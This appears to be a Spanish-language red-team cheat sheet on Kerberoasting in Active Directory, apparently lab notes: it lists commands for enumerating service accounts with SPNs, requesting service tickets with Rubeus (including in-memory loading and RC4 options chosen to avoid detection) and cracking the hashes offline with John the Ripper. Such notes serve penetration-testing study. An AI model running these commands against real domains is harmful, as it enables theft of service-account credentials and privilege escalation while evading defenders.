# PrivEsc Kerberoasting 

Tags: #AD #kerberoasting 

```bash 
- Crackeo offline de contraseñas de cuentas de servicio.
- El ticket de sesión de Kerberos ('TGS') contiene una porción destinada al servidor que está cifrada con el hash de la contraseña de la cuenta de servicio.  
    Esto permite solicitar un ticket y realizar un 'ataque de contraseñas offline'.
- Debido a que las contraseñas de cuentas de servicio (que no son de máquina) 'no se cambian con frecuencia', este se ha convertido en un ataque muy popular.
```

```bash 
## Regla de oro (Kerberoasting)

- RC4 (rc4_hmac / etype 23)                   →   🔴 Fácil de crackear
- AES128 (aes128_cts_hmac_sha1 / etype 17)    →   🟡 Mucho más difícil
- AES256 (aes256_cts_hmac_sha1 / etype 18)    →   🟡 Mucho más difícil
```

## ActiveDirectory Module 

```powershell 
! Usuario: Usuario de dominio

❯ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting.
```

## Powerview

```powershell 
! Usuario: Usuario de dominio

❯ Get-DomainUser -SPN
# Enumerar cuentas de usuario con SPNs registrados, identifica cuentas de servicio candidatas para Kerberoasting.
```

## Rubeus 

```powershell 
! Usuario: Usuario de dominio

❯ Rubeus.exe kerberoast /stats
❯ .\Loader.exe -path C:\AD\Rubeus.exe -args kerberoast /stats
# Listar estadísticas de cuentas Kerberoasteables en el dominio — muestra cantidad de cuentas y tipos de cifrado soportados.

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args kerberoast 
# Solicitar un TGS para una cuenta de servicio (No recomendable ya solicita todos los tickets de servicio y es muy detectable)

❯ Rubeus.exe kerberoast /user:svcadmin /simple  # Manera correcta de solicitar un TGS 
# Solicitar un TGS para una cuenta de servicio específica y mostrar el hash en formato simple listo para crackear.

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args klist 
# Listar los tickets Kerberos activos en la sesión actual cargando Rubeus en memoria vía Loader.exe

❯ Rubeus.exe kerberoast /stats /rc4opsec
# Listar solo cuentas Kerberoasteables que soportan únicamente RC4_HMAC — evita detecciones por downgrade de cifrado (EType 0x17).

❯ Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec
# Solicitar TGS de una cuenta específica forzando RC4_HMAC — más sigiloso al evitar downgrade detectable.

❯ Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
# Kerberoastear todas las cuentas posibles usando RC4_HMAC y guardar los hashes en un archivo para crackear offline.
```

## Cracking 

```powershell 
! Usuario: Usuario local (atacante)

❯ .\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt asrep_hash.txt
# Crackear los hashes Kerberoasteados offline usando John the Ripper con un wordlist — recupera la contraseña en texto claro de la cuenta de servicio.

Nota:
	- El hash que se obtiene se debe de modificar y quitar la parte de ':1433'
```

```bash 
# Utilizar las siguientes herramientas para generar diccionarios customizados
- Crunch 
- CeWL
- Bopscrk
```

![](Pasted%20image%2020260420172517.png)